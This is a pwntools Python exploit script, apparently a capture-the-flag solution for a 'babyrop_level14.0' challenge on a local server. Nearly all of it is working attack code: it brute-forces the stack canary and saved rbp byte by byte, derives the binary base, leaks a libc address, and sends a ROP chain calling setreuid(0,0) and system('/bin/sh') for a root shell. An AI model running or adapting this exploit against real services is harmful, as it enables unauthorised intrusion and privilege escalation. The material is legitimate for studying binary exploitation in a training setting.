# idea: brute-force canary -> brute-force main addr -> get binary base addr -> puts@plt(puts@got) to leak libc addr -> ret2libc
from pwn import *

context.arch = 'amd64'

binary = ELF("/challenge/babyrop_level14.0")
rop = ROP(binary)

padding = b"A" * 0x28 # not including canary

# just connect to server
def connect_to_chall():
    p = remote('127.0.0.1', 1337)
    return p

# send sth to server
def send_to_chall(buf:bytes):
    p = connect_to_chall()
    p.send(buf)
    msg = p.recvall()
    p.close()
    return msg

# brute force canary
def brute_canary():
    canary = b"\x00"
    for _ in range(7): # 7 bytes left for canary
        for i in range(256):
            canary_tmp = canary + bytes([i])
            msg = send_to_chall(padding + canary_tmp)
            if b"stack smashing detected" not in msg:
                canary = canary_tmp
                break
    return canary

# brute force rbp
def brute_rbp(canary:bytes):
    rbp = b""
    for _ in range(6): #6 bytes rbp
        for i in range(256):
            rbp_tmp = rbp + bytes([i])
            msg = send_to_chall(padding + canary + rbp_tmp)
            print(msg)
            if b"stack smashing detected" not in msg:
                rbp = rbp_tmp
                break
    return rbp

# brute force _start addr
def brute_start(canary:bytes, rbp:bytes):
    start_addr = b"\x20" # ?320
    for i in range(16):
        start_addr_tmp = start_addr + bytes([i*16 + 3])
        p = connect_to_chall()
        p.send(padding + canary + rbp + start_addr_tmp)
        #p.recvuntil(b"Leaving!\n###")
        msg = b""
        while p.can_recv_raw(1):
            msg += p.recv()
        if b"Welcome" in msg:
            start_addr = start_addr_tmp
            break
        p.close()
    # got 2 bytes, 4 bytes left to brute force
    for _ in range(4):
        for i in range(256):
            start_addr_tmp = start_addr + bytes([i])
            p = connect_to_chall()
            p.send(padding + canary + rbp + start_addr_tmp)
            #p.recvuntil(b"Leaving!\n###")
            msg = b""
            while p.can_recv_raw(1):
                msg += p.recv()
            if b"Welcome" in msg:
                start_addr = start_addr_tmp
                break
            p.close()
    return start_addr

canary = brute_canary()
print(canary)
rbp = brute_rbp(canary) + b"\x00\x00"
print(rbp)
#start_addr = brute_start(canary, rbp) + b"\x00\x00"
#print(start_addr)
start_addr = 0x0000555f74ff4320
binary_base = start_addr - binary.sym['_start']

'''
# leak libc addr
pop_rdi = rop.rdi.address + binary_base
puts_plt = binary.plt.puts + binary_base
puts_got = binary.got.puts + binary_base
start = binary.sym['_start'] + binary_base

rop.raw(pop_rdi)
rop.raw(puts_got)
rop.raw(puts_plt)
rop.raw(start)

payload = padding + canary + rbp + rop.chain()

p = connect_to_chall()
p.send(payload)
#p.recvuntil(b"Leaving!\n")
print(p.recvall())
puts_addr = unpack(p.recvuntil(b"\n")[:-1], 'all')
'''

puts_addr = b" \x94Ct\x1c\x7f"

# get libc base addr
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = unpack(puts_addr, 'all') - libc.symbols['puts']

# system("/bin/sh")
bin_sh = next(libc.search(b'/bin/sh'))
rop = ROP(libc)
rop.setreuid(0, 0)  # equivalent to rop.call(libc.setreuid, [0, 0])
ret = rop.ret.address
rop.system(bin_sh)  # equivalent to rop.call(libc.system, [bin_sh])
payload = padding + canary + rbp + rop.chain()

p = connect_to_chall()
p.send(payload)

p.interactive()
